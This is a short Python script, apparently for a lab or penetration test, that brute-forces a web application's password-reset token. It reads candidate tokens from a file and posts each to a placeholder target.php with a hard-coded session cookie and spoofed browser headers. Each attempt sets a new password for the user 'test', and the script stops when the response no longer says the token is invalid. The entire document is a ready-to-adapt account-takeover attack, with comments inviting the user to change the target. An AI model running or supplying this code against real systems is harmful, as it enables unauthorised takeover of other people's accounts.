import requests

# Add target URL
url = "http://www.target.local:8080/target.php" # Change this

# Load tokens from the file
with open("tokens.txt", "r") as file:
    tokens = file.read().splitlines()

# Define the cookies
cookies = {
    "PHPSESSID": "cqvjbdjcs2er17mdhejf93rkpr"
}

# Define the headers (change these)
headers = {
    "Host": "www.target.local:8080",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://www.target.local:8080",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://www.target.local:8080/reset.php?username=test",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
}

# Define the data template (change these)
data_template = {
    "username": "test",
    "token": None,  # This will be fuzzed
    "password": "iamcool",
    "pass_conf": "iamcool",
}

# Iterate over tokens and fuzz
for token in tokens:
    data_template["token"] = token
    response = requests.post(url, data=data_template, cookies=cookies, headers=headers, verify=False)

    if "Invalid Token" not in response.text:
        print(f"Valid token found: {token}")
        print(f"Response: {response.text}")
        break
    else:
        print(f"Invalid token: {token}")
